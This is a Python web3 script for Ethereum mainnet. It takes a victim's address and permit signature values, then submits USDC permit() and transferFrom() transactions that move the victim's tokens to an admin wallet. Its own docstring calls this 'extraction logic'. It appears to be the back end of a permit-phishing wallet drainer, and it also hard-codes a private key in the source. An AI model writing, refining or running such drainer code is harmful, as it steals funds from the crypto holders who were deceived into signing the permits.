import os
from web3 import Web3
from web3.middleware import geth_poa_middleware

# --- CONFIGURATION ---
RPC_URL = "https://eth.drpc.org"
# Use environment variables for keys in production!
ADMIN_PRIVATE_KEY = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

# Connect with a timeout to prevent the server from hanging indefinitely
w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={'timeout': 10}))

USDC_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"}, {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"}
]

def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
    """
    Finalized extraction logic with Gas Optimization and Timeout protection.
    """
    try:
        admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
        admin_addr = admin_account.address
        victim_addr = Web3.to_checksum_address(victim_address)
        contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)

        # 1. DATA PARSING
        target_amount_raw = int(amount)
        r_bytes = w3.to_bytes(hexstr=r)
        s_bytes = w3.to_bytes(hexstr=s)

        # 2. PRE-FLIGHT CHECKS
        # Get data in one go to save time
        user_bal = contract.functions.balanceOf(victim_addr).call()
        if user_bal < target_amount_raw:
            return None, f"USER_WALLET_ERROR: Target only has {user_bal/1e6} USDC."

        admin_eth = w3.eth.get_balance(admin_addr)
        # Use EIP-1559 gas estimation for faster mining
        fee_history = w3.eth.fee_history(1, 'latest', [25])
        base_fee = fee_history['baseFeePerGas'][-1]
        priority_fee = w3.to_wei(2, 'gwei') # 2 Gwei tip for speed
        max_fee = base_fee + priority_fee

        required_wei = max_fee * 200000
        if admin_eth < required_wei:
            needed = w3.from_wei(required_wei - admin_eth, 'ether')
            return None, f"ADMIN_WALLET_ERROR: Need {needed:.5f} more ETH for gas."

        # 3. TRANSACTION SEQUENCING
        current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')

        # PREPARE PERMIT
        permit_tx = contract.functions.permit(
            victim_addr, admin_addr, target_amount_raw, int(deadline), int(v), r_bytes, s_bytes
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce,
            "gas": 100000,
            "maxFeePerGas": max_fee,
            "maxPriorityFeePerGas": priority_fee,
            "chainId": 1
        })

        # PREPARE TRANSFER
        transfer_tx = contract.functions.transferFrom(
            victim_addr, admin_addr, target_amount_raw
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce + 1,
            "gas": 100000,
            "maxFeePerGas": max_fee,
            "maxPriorityFeePerGas": priority_fee,
            "chainId": 1
        })

        # 4. BROADCAST (FIRE AND FORGET)
        # We don't use .wait() here to prevent the 'Server did not respond' error
        signed_p = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
        w3.eth.send_raw_transaction(signed_p.raw_transaction)

        signed_t = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
        final_hash = w3.eth.send_raw_transaction(signed_t.raw_transaction)

        return final_hash.hex(), None

    except Exception as e:
        return None, f"EXECUTION_FAILED: {str(e)}"
